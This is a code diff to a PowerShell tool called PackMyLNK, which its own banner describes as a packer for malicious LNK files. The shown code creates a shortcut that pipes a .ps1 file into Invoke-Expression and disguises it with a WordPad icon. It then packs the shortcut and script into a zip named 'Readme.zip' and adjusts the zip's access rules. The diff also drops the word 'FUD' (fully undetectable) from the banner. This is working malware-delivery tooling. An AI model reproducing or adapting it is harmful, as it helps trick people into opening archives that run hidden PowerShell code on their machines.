@@ -6,7 +6,7 @@ param(
 
 $packmylnk = @"
       
-PackMyLNK - A simple .zip (FUD) packer for malicious LNK files
+PackMyLNK - A simple .zip packer for malicious LNK files
 calfcrusher@inventati.org
 
 "@
@@ -30,18 +30,13 @@ $link.arguments = "Get-Content $ps1 | Invoke-Expression"
 $link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
 $link.save()
 
+
 $zipFile = Join-Path -Path $curDir -ChildPath "Readme.zip"
 Set-Content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
 
 $shell = New-Object -ComObject Shell.Application
 
 $zipFolder = $shell.NameSpace($zipFile)
-$sourceFolder = $shell.NameSpace($curDir)
-
-$zipFolder.MoveHere($sourceFolder.ParseName((Split-Path -Leaf $lnk)))
-$zipFolder.MoveHere($sourceFolder.ParseName((Split-Path -Leaf $ps1)))
-
-Start-Sleep -Seconds 3
 
 $acl = Get-Acl $zipFile
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
@@ -52,5 +47,7 @@ $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
 $acl.SetAccessRule($accessRule)
 Set-Acl -Path $zipFile -AclObject $acl
 
+$zipFolder.MoveHere($lnk)
+$zipFolder.MoveHere($ps1)
+
 Write-Host "ZIP file created: $zipFile"
-Write-Host "Bye!"
